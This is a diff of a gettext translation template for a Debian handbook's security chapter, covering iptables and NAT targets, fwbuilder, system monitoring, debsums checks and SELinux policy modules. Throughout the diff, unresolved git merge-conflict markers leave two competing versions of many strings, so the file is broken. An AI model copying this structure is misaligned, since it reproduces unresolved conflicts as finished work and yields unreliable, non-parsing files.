@@ -1,14 +1,25 @@
+<<<<<<< HEAD
 #
+=======
+# 
+>>>>>>> 3c00e4cd8be4c57e266833a7341e2e5525b73cb5
 # AUTHOR <EMAIL@ADDRESS>, YEAR.
 #
 msgid ""
 msgstr ""
 "Project-Id-Version: 0\n"
+<<<<<<< HEAD
 "POT-Creation-Date: 2013-12-30 17:37+0100\n"
 "PO-Revision-Date: 2012-10-31T14:54:18\n"
 "Last-Translator: Automatically generated\n"
 "Language-Team: None\n"
 "Language: \n"
+=======
+"POT-Creation-Date: 2012-10-31T14:54:18\n"
+"PO-Revision-Date: 2012-10-31T14:54:18\n"
+"Last-Translator: Automatically generated\n"
+"Language-Team: None\n"
+>>>>>>> 3c00e4cd8be4c57e266833a7341e2e5525b73cb5
 "MIME-Version: 1.0\n"
 "Content-Type: application/x-publican; charset=UTF-8\n"
 "Content-Transfer-Encoding: 8bit\n"
@@ -190,7 +201,11 @@ msgstr ""
 
 #. Tag: para
 #, no-c-format
+<<<<<<< HEAD
 msgid "The Linux kernel embeds the <emphasis>netfilter</emphasis> firewall. It can be controlled from user-space with the <command>iptables</command> and <command>ip6tables</command> commands. The difference between these two commands is that the former acts on the IPv4 network, whereas the latter acts on IPv6. Since both network protocol stacks will probably be around for many years, both tools will need to be used in parallel."
+=======
+msgid "The Linux 2.6 kernel embeds the <emphasis>netfilter</emphasis> firewall. It can be controlled from user-space with the <command>iptables</command> and <command>ip6tables</command> commands. The difference between these two commands is that the former acts on the IPv4 network, whereas the latter acts on IPv6. Since both network protocol stacks will probably be around for many years, both tools will need to be used in parallel."
+>>>>>>> 3c00e4cd8be4c57e266833a7341e2e5525b73cb5
 msgstr ""
 
 #. Tag: indexterm
@@ -380,22 +395,38 @@ msgstr ""
 
 #. Tag: para
 #, no-c-format
+<<<<<<< HEAD
 msgid "<literal>SNAT</literal> (only in the <literal>nat</literal> table, therefore only in IPv4 on <emphasis role=\"distribution\">Wheezy</emphasis> — NAT support for IPv6 appeared in the Linux 3.7 kernel): apply <emphasis>Source NAT</emphasis> (extra options describe the exact changes to apply);"
+=======
+msgid "<literal>SNAT</literal> (only in the <literal>nat</literal> table, therefore only in IPv4): apply <emphasis>Source NAT</emphasis> (extra options describe the exact changes to apply);"
+>>>>>>> 3c00e4cd8be4c57e266833a7341e2e5525b73cb5
 msgstr ""
 
 #. Tag: para
 #, no-c-format
+<<<<<<< HEAD
 msgid "<literal>DNAT</literal> (only in the <literal>nat</literal> table, therefore only in IPv4 on <emphasis role=\"distribution\">Wheezy</emphasis>): apply <emphasis>Destination NAT</emphasis> (extra options describe the exact changes to apply);"
+=======
+msgid "<literal>DNAT</literal> (only in the <literal>nat</literal> table, therefore only in IPv4): apply <emphasis>Destination NAT</emphasis> (extra options describe the exact changes to apply);"
+>>>>>>> 3c00e4cd8be4c57e266833a7341e2e5525b73cb5
 msgstr ""
 
 #. Tag: para
 #, no-c-format
+<<<<<<< HEAD
 msgid "<literal>MASQUERADE</literal> (only in the <literal>nat</literal> table, therefore only in IPv4 on <emphasis role=\"distribution\">Wheezy</emphasis>): apply <emphasis>masquerading</emphasis> (a special case of <emphasis>Source NAT</emphasis>);"
+=======
+msgid "<literal>MASQUERADE</literal> (only in the <literal>nat</literal> table, therefore only in IPv4): apply <emphasis>masquerading</emphasis> (a special case of <emphasis>Source NAT</emphasis>);"
+>>>>>>> 3c00e4cd8be4c57e266833a7341e2e5525b73cb5
 msgstr ""
 
 #. Tag: para
 #, no-c-format
+<<<<<<< HEAD
 msgid "<literal>REDIRECT</literal> (only in the <literal>nat</literal> table, therefore only in IPv4 on <emphasis role=\"distribution\">Wheezy</emphasis>): redirect a packet to a given port of the firewall itself; this can be used to set up a transparent web proxy that works with no configuration on the client side, since the client thinks it connects to the recipient whereas the communications actually go through the proxy."
+=======
+msgid "<literal>REDIRECT</literal> (only in the <literal>nat</literal> table, therefore only in IPv4): redirect a packet to a given port of the firewall itself; this can be used to set up a transparent web proxy that works with no configuration on the client side, since the client thinks it connects to the recipient whereas the communications actually go through the proxy."
+>>>>>>> 3c00e4cd8be4c57e266833a7341e2e5525b73cb5
 msgstr ""
 
 #. Tag: para
@@ -420,7 +451,11 @@ msgstr ""
 
 #. Tag: para
 #, no-c-format
+<<<<<<< HEAD
 msgid "The <literal>-N <replaceable>chain</replaceable></literal> option creates a new chain. The <literal>-X <replaceable>chain</replaceable></literal> deletes an empty and unused chain. The <literal>-A <replaceable>chain</replaceable> <replaceable>rule</replaceable></literal> adds a rule at the end of the given chain. The <literal>-I <replaceable>chain</replaceable> <replaceable>rule_num</replaceable> <replaceable>rule</replaceable></literal> option inserts a rule before the rule number <replaceable>rule_num</replaceable>. The <literal>-D <replaceable>chain</replaceable> <replaceable>rule_num</replaceable></literal> (or <literal>-D <replaceable>chain</replaceable> <replaceable>rule</replaceable></literal>) option deletes a rule in a chain; the first syntax identifies the rule to be deleted by its number, while the latter identifies it by its contents. The <literal>-F <replaceable>chain</replaceable></literal> option flushes a chain (deletes all its rules); if no chain is mentioned, all the rules in the table are deleted. The <literal>-L <replaceable>chain</replaceable></literal> option lists the rules in the chain. Finally, the <literal>-P <replaceable>chain</replaceable> <replaceable>action</replaceable></literal> option defines the default action, or “policy”, for a given chain; note that only standard chains can have such a policy."
+=======
+msgid "The <literal>-N <replaceable>chain</replaceable></literal> option creates a new chain. The <literal>-X <replaceable>chain</replaceable></literal> deletes an empty and unused chain. The <literal>-A <replaceable>chain</replaceable><replaceable>rule</replaceable></literal> adds a rule at the end of the given chain. The <literal>-I <replaceable>chain</replaceable> <replaceable>rule_num</replaceable><replaceable>rule</replaceable></literal> option inserts a rule before the rule number <replaceable>rule_num</replaceable>. The <literal>-D <replaceable>chain</replaceable><replaceable>rule_num</replaceable></literal> (or <literal>-D <replaceable>chain</replaceable><replaceable>rule</replaceable></literal>) option deletes a rule in a chain; the first syntax identifies the rule to be deleted by its number, while the latter identifies it by its contents. The <literal>-F <replaceable>chain</replaceable></literal> option flushes a chain (deletes all its rules); if no chain is mentioned, all the rules in the table are deleted. The <literal>-L <replaceable>chain</replaceable></literal> option lists the rules in the chain. Finally, the <literal>-P <replaceable>chain</replaceable><replaceable>action</replaceable></literal> option defines the default action, or “policy”, for a given chain; note that only standard chains can have such a policy."
+>>>>>>> 3c00e4cd8be4c57e266833a7341e2e5525b73cb5
 msgstr ""
 
 #. Tag: title
@@ -430,7 +465,11 @@ msgstr ""
 
 #. Tag: para
 #, no-c-format
+<<<<<<< HEAD
 msgid "Each rule is expressed as <literal><replaceable>conditions</replaceable> -j <replaceable>action</replaceable> <replaceable>action_options</replaceable></literal>. If several conditions are described in the same rule, then the criterion is the conjunction (logical <emphasis>and</emphasis>) of the conditions, which is at least as restrictive as each individual condition."
+=======
+msgid "Each rule is expressed as <literal><replaceable>conditions</replaceable> -j <replaceable>action</replaceable><replaceable>action_options</replaceable></literal>. If several conditions are described in the same rule, then the criterion is the conjunction (logical <emphasis>and</emphasis>) of the conditions, which is at least as restrictive as each individual condition."
+>>>>>>> 3c00e4cd8be4c57e266833a7341e2e5525b73cb5
 msgstr ""
 
 #. Tag: para
@@ -480,12 +519,20 @@ msgstr ""
 
 #. Tag: para
 #, no-c-format
+<<<<<<< HEAD
 msgid "The <literal>DNAT</literal> action provides the <literal>--to-destination <replaceable>address</replaceable>:<replaceable>port</replaceable></literal> option to indicate the new destination IP address and/or port. Similarly, <literal>SNAT</literal> provides <literal>--to-source <replaceable>address</replaceable>:<replaceable>port</replaceable></literal> to indicate the new source IP address and/or port."
+=======
+msgid "The <literal>DNAT</literal> action (only available for IPv4) provides the <literal>--to-destination <replaceable>address</replaceable>:<replaceable>port</replaceable></literal> option to indicate the new destination IP address and/or port. Similarly, <literal>SNAT</literal> provides <literal>--to-source <replaceable>address</replaceable>:<replaceable>port</replaceable></literal> to indicate the new source IP address and/or port."
+>>>>>>> 3c00e4cd8be4c57e266833a7341e2e5525b73cb5
 msgstr ""
 
 #. Tag: para
 #, no-c-format
+<<<<<<< HEAD
 msgid "The <literal>REDIRECT</literal> action (only available if NAT is available — on <emphasis role=\"distribution\">Wheezy</emphasis>, this means IPv4 only) provides the <literal>--to-ports <replaceable>port(s)</replaceable></literal> option to indicate the port, or port range, where the packets should be redirected."
+=======
+msgid "The <literal>REDIRECT</literal> action (only available for IPv4) provides the <literal>--to-ports <replaceable>port(s)</replaceable></literal> option to indicate the port, or port range, where the packets should be redirected."
+>>>>>>> 3c00e4cd8be4c57e266833a7341e2e5525b73cb5
 msgstr ""
 
 #. Tag: title
@@ -545,7 +592,11 @@ msgstr ""
 
 #. Tag: para
 #, no-c-format
+<<<<<<< HEAD
 msgid "<command>fwbuilder</command> can then generate a script configuring the firewall according to the rules that have been defined. Its modular architecture gives it the ability to generate scripts targeting different systems (<command>iptables</command> for Linux, <command>ipf</command> for FreeBSD and <command>pf</command> for OpenBSD)."
+=======
+msgid "<command>fwbuilder</command> can then generate a script configuring the firewall according to the rules that have been defined. Its modular architecture gives it the ability to generate scripts targeting different systems (<command>iptables</command> for Linux 2.4/2.6, <command>ipf</command> for FreeBSD and <command>pf</command> for OpenBSD)."
+>>>>>>> 3c00e4cd8be4c57e266833a7341e2e5525b73cb5
 msgstr ""
 
 #. Tag: para
@@ -555,9 +606,15 @@ msgstr ""
 
 #. Tag: screen
 #, no-c-format
+<<<<<<< HEAD
 msgid ""
 "\n"
 "<computeroutput># </computeroutput><userinput>aptitude install fwbuilder</userinput>\n"
+=======
+msgid "\n"
+"<computeroutput># </computeroutput><userinput>aptitude install fwbuilder</userinput>\n"
+""
+>>>>>>> 3c00e4cd8be4c57e266833a7341e2e5525b73cb5
 msgstr ""
 
 #. Tag: title
@@ -582,14 +639,22 @@ msgstr ""
 
 #. Tag: programlisting
 #, no-c-format
+<<<<<<< HEAD
 msgid ""
 "auto eth0\n"
+=======
+msgid "auto eth0\n"
+>>>>>>> 3c00e4cd8be4c57e266833a7341e2e5525b73cb5
 "iface eth0 inet static\n"
 "    address 192.168.0.1\n"
 "    network 192.168.0.0\n"
 "    netmask 255.255.255.0\n"
 "    broadcast 192.168.0.255\n"
 "    up /usr/local/etc/arrakis.fw\n"
+<<<<<<< HEAD
+=======
+""
+>>>>>>> 3c00e4cd8be4c57e266833a7341e2e5525b73cb5
 msgstr ""
 
 #. Tag: title
@@ -604,7 +669,11 @@ msgstr ""
 
 #. Tag: para
 #, no-c-format
+<<<<<<< HEAD
 msgid "Monitoring is an integral part of any security policy for several reasons. Among them, that the goal of security is usually not restricted to guaranteeing data confidentiality, but it also includes ensuring availability of the services. It is therefore imperative to check that everything works as expected, and to detect in a timely manner any deviant behavior or change in quality of the service(s) rendered. Monitoring activity can help detecting intrusion attempts and enable a swift reaction before they cause grave consequences. This section reviews some tools that can be used to monitor several aspects of a Debian system. As such, it completes the section dedicated to generic system monitoring in <xref linkend=\"advanced-administration\" />."
+=======
+msgid "Monitoring is an integral part of any security policy for several reasons. Among them, that the goal of security is usually not restricted to guaranteeing data confidentiality, but it also includes ensuring availability of the services. It is therefore imperative to check that everything works as expected, and to detect in a timely manner any deviant behavior or change in quality of the service(s) rendered. Monitoring activity can enable the detection of intrusion attempts and enable a swift reaction before they cause grave consequences. This section reviews some tools that can be used to monitor several aspects of a Debian system. As such, it completes the section dedicated to generic system monitoring in <xref linkend=\"advanced-administration\" />."
+>>>>>>> 3c00e4cd8be4c57e266833a7341e2e5525b73cb5
 msgstr ""
 
 #. Tag: title
@@ -757,11 +826,42 @@ msgstr ""
 msgid "The <command>gnome-system-monitor</command> and <command>qps</command> graphical tools are similar to <command>top</command> and they provide roughly the same features."
 msgstr ""
 
+<<<<<<< HEAD
+=======
+#. Tag: title
+#, no-c-format
+msgid "<emphasis>TIP</emphasis> Visual representations of activity"
+msgstr ""
+
+#. Tag: para
+#, no-c-format
+msgid "For more visual (and entertaining) representations of a computer's activity, one should investigate the <emphasis role=\"pkg\">lavaps</emphasis>, <emphasis role=\"pkg\">bubblemon</emphasis> and <emphasis role=\"pkg\">bubblefishymon</emphasis> packages. <command>lavaps</command> displays running processes as the wax bubbles in a lava-lamp. <emphasis>bubblemon</emphasis> is a desktop panel applet representing the amount of used memory and the processor usage as an aquarium with bubbles. <command>bubblefishymon</command> is rather similar, but it also adds fish representing network traffic (and even a duck)."
+msgstr ""
+
+>>>>>>> 3c00e4cd8be4c57e266833a7341e2e5525b73cb5
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary><command>gnome-system-monitor</command></primary>"
 msgstr ""
 
+<<<<<<< HEAD
+=======
+#. Tag: indexterm
+#, no-c-format
+msgid "<primary><command>lavaps</command></primary>"
+msgstr ""
+
+#. Tag: indexterm
+#, no-c-format
+msgid "<primary><command>bubblefishymon</command></primary>"
+msgstr ""
+
+#. Tag: indexterm
+#, no-c-format
+msgid "<primary><emphasis>bubblemon</emphasis></primary>"
+msgstr ""
+
+>>>>>>> 3c00e4cd8be4c57e266833a7341e2e5525b73cb5
 #. Tag: title
 #, no-c-format
 msgid "History"
@@ -794,7 +894,11 @@ msgstr ""
 
 #. Tag: para
 #, no-c-format
+<<<<<<< HEAD
 msgid "This book deals with Munin in some detail (see <xref linkend=\"sect.munin\" />) as part of <xref linkend=\"advanced-administration\" xrefstyle=\"select: label quotedtitle\" />. Debian also provides a similar tool, <emphasis role=\"pkg\">cacti</emphasis>. Its deployment is slightly more complex, since it is based solely on SNMP. Despite having a web interface, grasping the concepts involved in configuration still requires some effort. Reading the HTML documentation (<filename>/usr/share/doc/cacti/html/index.html</filename>) should be considered a prerequisite."
+=======
+msgid "This book deals with Munin in some detail (see <xref linkend=\"section.munin\" />) as part of <xref linkend=\"advanced-administration\" xrefstyle=\"select: label quotedtitle\" />. Debian also provides a similar tool, <emphasis role=\"pkg\">cacti</emphasis>. Its deployment is slightly more complex, since it is based solely on SNMP. Despite having a web interface, grasping the concepts involved in configuration still requires some effort. Reading the HTML documentation (<filename>/usr/share/doc/cacti/html/index.html</filename>) should be considered a prerequisite."
+>>>>>>> 3c00e4cd8be4c57e266833a7341e2e5525b73cb5
 msgstr ""
 
 #. Tag: title
@@ -864,8 +968,12 @@ msgstr ""
 
 #. Tag: screen
 #, no-c-format
+<<<<<<< HEAD
 msgid ""
 "\n"
+=======
+msgid "\n"
+>>>>>>> 3c00e4cd8be4c57e266833a7341e2e5525b73cb5
 "<computeroutput># </computeroutput><userinput>apt-get --reinstall -d install `debsums -l`</userinput>\n"
 "<computeroutput>[ ... ]\n"
 "# </computeroutput><userinput>debsums -p /var/cache/apt/archives -g</userinput>\n"
@@ -884,8 +992,12 @@ msgstr ""
 
 #. Tag: screen
 #, no-c-format
+<<<<<<< HEAD
 msgid ""
 "\n"
+=======
+msgid "\n"
+>>>>>>> 3c00e4cd8be4c57e266833a7341e2e5525b73cb5
 "<computeroutput># </computeroutput><userinput>apt-get --reinstall -d install `grep-status -e 'Status: install ok installed' -n -s Package`</userinput>\n"
 "<computeroutput>[ ... ]\n"
 "# </computeroutput><userinput>debsums -p /var/cache/apt/archives --generate=all</userinput>\n"
@@ -1049,7 +1161,11 @@ msgstr ""
 
 #. Tag: para
 #, no-c-format
+<<<<<<< HEAD
 msgid "Snort can be configured as such a sensor. Other possibilities include <emphasis>prelude-lml</emphasis> (<emphasis>Log Monitor Lackey</emphasis>) which monitors log files (in a manner similar to <command>logcheck</command>, described in <xref linkend=\"sect.logcheck\" />)."
+=======
+msgid "Snort can be configured as such a sensor. Other possibilities include <emphasis>prelude-lml</emphasis> (<emphasis>Log Monitor Lackey</emphasis>) which monitors log files (in a manner similar to <command>logcheck</command>, described in <xref linkend=\"section.logcheck\" />)."
+>>>>>>> 3c00e4cd8be4c57e266833a7341e2e5525b73cb5
 msgstr ""
 
 #. Tag: indexterm
@@ -1119,7 +1235,11 @@ msgstr ""
 
 #. Tag: para
 #, no-c-format
+<<<<<<< HEAD
 msgid "Obviously the rights do not apply to all <emphasis>objects</emphasis> (files, directories, sockets, devices, etc.). They can vary from object to object. To achieve this, each object is associated to a <emphasis>type</emphasis> (this is known as labeling). Domains' rights are thus expressed with sets of (dis)allowed operations on those types (and, indirectly, on all objects which are labeled with the given type)."
+=======
+msgid "Obviously the rights do not apply to all <emphasis>objects</emphasis> (files, directories, sockets, devices, etc.). They can vary from object to object. To achieve this, each object is associated to a <emphasis>type</emphasis> (this is known as labeling). Domain's rights are thus expressed with sets of (dis)allowed operations on those types (and, indirectly, on all objects which are labeled with the given type)."
+>>>>>>> 3c00e4cd8be4c57e266833a7341e2e5525b73cb5
 msgstr ""
 
 #. Tag: title
@@ -1129,12 +1249,20 @@ msgstr ""
 
 #. Tag: para
 #, no-c-format
+<<<<<<< HEAD
 msgid "Internally, a domain is just a type, but a type that only applies to processes. That's why domains are suffixed with <literal>_t</literal> just like objects' types."
+=======
+msgid "Internally, a domain is just a type, but a type that only applies to processes. That's why domains are suffixed with <literal>_t</literal> just like object's types."
+>>>>>>> 3c00e4cd8be4c57e266833a7341e2e5525b73cb5
 msgstr ""
 
 #. Tag: para
 #, no-c-format
+<<<<<<< HEAD
 msgid "By default, a program inherits its domain from the user who started it, but the standard SELinux policies expect many important programs to run in dedicated domains. To achieve this, those executables are labeled with a dedicated type (for example <command>ssh</command> is labeled with <literal>ssh_exec_t</literal>, and when the program starts, it automatically switches to the <literal>ssh_t</literal> domain). This automatic domain transition mechanism makes it possible to grant only the rights required by each program. It is a fundamental principle of SELinux."
+=======
+msgid "By default, a program inherits its domain from the user who started it, but the standard SELinux policies expect many important programs to run in dedicated domains. To achieve this, those executables are labeled with a dedicated type (for example <command>ssh</command> is labeled with <literal>ssh_exec_t</literal>, and when the program starts, it automatically switches in the <literal>ssh_t</literal> domain). This automatic domain transition mechanism makes it possible to grant only the rights required by each program. It is a fundamental principle of SELinux."
+>>>>>>> 3c00e4cd8be4c57e266833a7341e2e5525b73cb5
 msgstr ""
 
 #. Tag: title
@@ -1169,9 +1297,15 @@ msgstr ""
 
 #. Tag: screen
 #, no-c-format
+<<<<<<< HEAD
 msgid ""
 "<computeroutput>$ </computeroutput><userinput>ps axZ | grep vstfpd</userinput>\n"
 "<computeroutput>system_u:system_r:ftpd_t:s0   2094 ?    Ss  0:00 /usr/sbin/vsftpd</computeroutput>\n"
+=======
+msgid "<computeroutput>$ </computeroutput><userinput>ps axZ | grep vstfpd</userinput>\n"
+"<computeroutput>system_u:system_r:ftpd_t:s0   2094 ?    Ss  0:00 /usr/sbin/vsftpd</computeroutput>\n"
+""
+>>>>>>> 3c00e4cd8be4c57e266833a7341e2e5525b73cb5
 msgstr ""
 
 #. Tag: para
@@ -1186,9 +1320,15 @@ msgstr ""
 
 #. Tag: screen
 #, no-c-format
+<<<<<<< HEAD
 msgid ""
 "<computeroutput>$ </computeroutput><userinput>id -Z</userinput>\n"
 "<computeroutput>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</computeroutput>\n"
+=======
+msgid "<computeroutput>$ </computeroutput><userinput>id -Z</userinput>\n"
+"<computeroutput>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</computeroutput>\n"
+""
+>>>>>>> 3c00e4cd8be4c57e266833a7341e2e5525b73cb5
 msgstr ""
 
 #. Tag: para
@@ -1198,10 +1338,17 @@ msgstr ""
 
 #. Tag: screen
 #, no-c-format
+<<<<<<< HEAD
 msgid ""
 "<computeroutput>$ </computeroutput><userinput>ls -Z test /usr/bin/ssh</userinput>\n"
 "<computeroutput>unconfined_u:object_r:user_home_t:s0 test\n"
 "     system_u:object_r:ssh_exec_t:s0 /usr/bin/ssh</computeroutput>\n"
+=======
+msgid "<computeroutput>$ </computeroutput><userinput>ls -Z test /usr/bin/ssh</userinput>\n"
+"<computeroutput>unconfined_u:object_r:user_home_t:s0 test\n"
+"     system_u:object_r:ssh_exec_t:s0 /usr/bin/ssh</computeroutput>\n"
+""
+>>>>>>> 3c00e4cd8be4c57e266833a7341e2e5525b73cb5
 msgstr ""
 
 #. Tag: para
@@ -1226,7 +1373,11 @@ msgstr ""
 
 #. Tag: para
 #, no-c-format
+<<<<<<< HEAD
 msgid "The <emphasis role=\"pkg\">selinux-policy-default</emphasis> package contains a set of standard rules. By default, this policy only restricts access for a few widely exposed services. The user sessions are not restricted and it is thus unlikely that SELinux would block legitimate user operations. However, this does enhance the security of system services running on the machine. To setup a policy equivalent to the old “strict” rules, you just have to disable the <literal>unconfined</literal> module (modules management is detailed further in this section)."
+=======
+msgid "The <emphasis role=\"pkg\">selinux-policy-default</emphasis> package contains a set of standard rules. By default, this policy only restricts access for a few broadly exposed services. The user sessions are not restricted and it is thus unlikely that SELinux would block legitimate user operations. However, this does enhance the security of system services running on the machine. To setup a policy equivalent to the old “strict” rules, you just have to disable the <literal>unconfined</literal> module (modules management is detailed further in this section)."
+>>>>>>> 3c00e4cd8be4c57e266833a7341e2e5525b73cb5
 msgstr ""
 
 #. Tag: para
@@ -1301,8 +1452,12 @@ msgstr ""
 
 #. Tag: screen
 #, no-c-format
+<<<<<<< HEAD
 msgid ""
 "<computeroutput># </computeroutput><userinput>semodule -i /usr/share/selinux/default/aide.pp</userinput>\n"
+=======
+msgid "<computeroutput># </computeroutput><userinput>semodule -i /usr/share/selinux/default/aide.pp</userinput>\n"
+>>>>>>> 3c00e4cd8be4c57e266833a7341e2e5525b73cb5
 "<computeroutput># </computeroutput><userinput>semodule -l</userinput>\n"
 "<computeroutput>aide    1.4.0\n"
 "apache  1.10.0\n"
@@ -1313,6 +1468,10 @@ msgid ""
 "<computeroutput>apache  1.10.0\n"
 "apm     1.7.0\n"
 "[...]</computeroutput>\n"
+<<<<<<< HEAD
+=======
+""
+>>>>>>> 3c00e4cd8be4c57e266833a7341e2e5525b73cb5
 msgstr ""
 
 #. Tag: para
@@ -1342,8 +1501,12 @@ msgstr ""
 
 #. Tag: screen
 #, no-c-format
+<<<<<<< HEAD
 msgid ""
 "<computeroutput># </computeroutput><userinput>semanage login -a -s user_u rhertzog</userinput>\n"
+=======
+msgid "<computeroutput># </computeroutput><userinput>semanage login -a -s user_u rhertzog</userinput>\n"
+>>>>>>> 3c00e4cd8be4c57e266833a7341e2e5525b73cb5
 "<computeroutput># </computeroutput><userinput>semanage login -l</userinput>\n"
 "<computeroutput>\n"
 "Login Name                SELinux User              MLS/MCS Range\n"
@@ -1353,6 +1516,10 @@ msgid ""
 "root                      unconfined_u              s0-s0:c0.c1023\n"
 "system_u                  system_u                  s0-s0:c0.c1023\n"
 "# </computeroutput><userinput>semanage login -d rhertzog</userinput> \n"
+<<<<<<< HEAD
+=======
+""
+>>>>>>> 3c00e4cd8be4c57e266833a7341e2e5525b73cb5
 msgstr ""
 
 #. Tag: para
@@ -1362,8 +1529,12 @@ msgstr ""
 
 #. Tag: screen
 #, no-c-format
+<<<<<<< HEAD
 msgid ""
 "<computeroutput># </computeroutput><userinput>semanage user -a -R 'staff_r user_r' -P staff test_u</userinput>\n"
+=======
+msgid "<computeroutput># </computeroutput><userinput>semanage user -a -R 'staff_r user_r' -P staff test_u</userinput>\n"
+>>>>>>> 3c00e4cd8be4c57e266833a7341e2e5525b73cb5
 "<computeroutput># </computeroutput><userinput>semanage user -l</userinput>\n"
 "<computeroutput>\n"
 "                Labeling   MLS/       MLS/\n"
@@ -1377,6 +1548,10 @@ msgid ""
 "unconfined_u    unconfined s0         s0-s0:c0.c1023   system_r unconfined_r\n"
 "user_u          user       s0         s0               user_r\n"
 "# </computeroutput><userinput>semanage user -d test_u</userinput>\n"
+<<<<<<< HEAD
+=======
+""
+>>>>>>> 3c00e4cd8be4c57e266833a7341e2e5525b73cb5
 msgstr ""
 
 #. Tag: title
@@ -1401,12 +1576,20 @@ msgstr ""
 
 #. Tag: screen
 #, no-c-format
+<<<<<<< HEAD
 msgid ""
 "<computeroutput># </computeroutput><userinput>getsebool httpd_enable_homedirs</userinput>\n"
+=======
+msgid "<computeroutput># </computeroutput><userinput>getsebool httpd_enable_homedirs</userinput>\n"
+>>>>>>> 3c00e4cd8be4c57e266833a7341e2e5525b73cb5
 "<computeroutput>httpd_enable_homedirs --&gt; off\n"
 "# </computeroutput><userinput>setsebool -P httpd_enable_homedirs on</userinput>\n"
 "<computeroutput># </computeroutput><userinput>getsebool httpd_enable_homedirs</userinput> \n"
 "<computeroutput>httpd_enable_homedirs --&gt; on</computeroutput>\n"
+<<<<<<< HEAD
+=======
+""
+>>>>>>> 3c00e4cd8be4c57e266833a7341e2e5525b73cb5
 msgstr ""
 
 #. Tag: title
@@ -1426,11 +1609,19 @@ msgstr ""
 
 #. Tag: screen
 #, no-c-format
+<<<<<<< HEAD
 msgid ""
 "<computeroutput>$ </computeroutput><userinput>zcat /usr/share/doc/selinux-policy-doc/Makefile.example.gz &gt;Makefile</userinput>\n"
 "<computeroutput>$ </computeroutput><userinput>zcat /usr/share/doc/selinux-policy-doc/example.fc.gz &gt;example.fc</userinput>\n"
 "<computeroutput>$ </computeroutput><userinput>zcat /usr/share/doc/selinux-policy-doc/example.if.gz &gt;example.if</userinput>\n"
 "<computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/example.te ./</userinput>\n"
+=======
+msgid "<computeroutput>$ </computeroutput><userinput>zcat /usr/share/doc/selinux-policy-doc/Makefile.example.gz &gt;Makefile</userinput>\n"
+"<computeroutput>$ </computeroutput><userinput>zcat /usr/share/doc/selinux-policy-doc/example.fc.gz &gt;example.fc</userinput>\n"
+"<computeroutput>$ </computeroutput><userinput>zcat /usr/share/doc/selinux-policy-doc/example.if.gz &gt;example.if</userinput>\n"
+"<computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/example.te ./</userinput>\n"
+""
+>>>>>>> 3c00e4cd8be4c57e266833a7341e2e5525b73cb5
 msgstr ""
 
 #. Tag: para
@@ -1455,13 +1646,21 @@ msgstr ""
 
 #. Tag: programlisting
 #, no-c-format
+<<<<<<< HEAD
 msgid ""
 "# myapp executable will have:\n"
+=======
+msgid "# myapp executable will have:\n"
+>>>>>>> 3c00e4cd8be4c57e266833a7341e2e5525b73cb5
 "# label: system_u:object_r:myapp_exec_t\n"
 "# MLS sensitivity: s0\n"
 "# MCS categories: &lt;none&gt;\n"
 "\n"
 "/usr/sbin/myapp         --      gen_context(system_u:object_r:myapp_exec_t,s0)\n"
+<<<<<<< HEAD
+=======
+""
+>>>>>>> 3c00e4cd8be4c57e266833a7341e2e5525b73cb5
 msgstr ""
 
 #. Tag: title
@@ -1486,8 +1685,12 @@ msgstr ""
 
 #. Tag: programlisting
 #, no-c-format
+<<<<<<< HEAD
 msgid ""
 "## &lt;summary&gt;Myapp example policy&lt;/summary&gt;\n"
+=======
+msgid "## &lt;summary&gt;Myapp example policy&lt;/summary&gt;\n"
+>>>>>>> 3c00e4cd8be4c57e266833a7341e2e5525b73cb5
 "## &lt;desc&gt;\n"
 "##      &lt;p&gt;\n"
 "##              More descriptive text about myapp.  The &lt;desc&gt;\n"
@@ -1537,6 +1740,10 @@ msgid ""
 "        logging_search_logs($1)\n"
 "        allow $1 myapp_log_t:file r_file_perms;\n"
 "')\n"
+<<<<<<< HEAD
+=======
+""
+>>>>>>> 3c00e4cd8be4c57e266833a7341e2e5525b73cb5
 msgstr ""
 
 #. Tag: title
@@ -1581,8 +1788,12 @@ msgstr ""
 
 #. Tag: programlisting
 #, no-c-format
+<<<<<<< HEAD
 msgid ""
 "policy_module(myapp,1.0.0) <co id=\"example.te.module\"></co>\n"
+=======
+msgid "policy_module(myapp,1.0.0) <co id=\"example.te.module\"></co>\n"
+>>>>>>> 3c00e4cd8be4c57e266833a7341e2e5525b73cb5
 "\n"
 "########################################\n"
 "#\n"
@@ -1609,6 +1820,10 @@ msgid ""
 "\n"
 "allow myapp_t myapp_tmp_t:file manage_file_perms;\n"
 "files_tmp_filetrans(myapp_t,myapp_tmp_t,file)\n"
+<<<<<<< HEAD
+=======
+""
+>>>>>>> 3c00e4cd8be4c57e266833a7341e2e5525b73cb5
 msgstr ""
 
 #. Tag: para
@@ -1659,6 +1874,10 @@ msgstr ""
 #. Tag: programlisting
 #, no-c-format
 msgid "avc:  denied  { read write } for  pid=1876 comm=\"syslogd\" name=\"xconsole\" dev=tmpfs ino=5510 scontext=system_u:system_r:syslogd_t:s0 tcontext=system_u:object_r:device_t:s0 tclass=fifo_file\n"
+<<<<<<< HEAD
+=======
+""
+>>>>>>> 3c00e4cd8be4c57e266833a7341e2e5525b73cb5
 msgstr ""
 
 #. Tag: para
@@ -2063,8 +2282,12 @@ msgstr ""
 
 #. Tag: screen
 #, no-c-format
+<<<<<<< HEAD
 msgid ""
 "\n"
+=======
+msgid "\n"
+>>>>>>> 3c00e4cd8be4c57e266833a7341e2e5525b73cb5
 "<computeroutput># </computeroutput><userinput>ls -al /proc/3719/exe</userinput>\n"
 "<computeroutput>lrwxrwxrwx 1 www-data www-data 0 2007-04-20 16:19 /proc/3719/exe -&gt; /var/tmp/.bash_httpd/psybnc</computeroutput>\n"
 "      "
@@ -2237,8 +2460,12 @@ msgstr ""
 
 #. Tag: programlisting
 #, no-c-format
+<<<<<<< HEAD
 msgid ""
 "\n"
+=======
+msgid "\n"
+>>>>>>> 3c00e4cd8be4c57e266833a7341e2e5525b73cb5
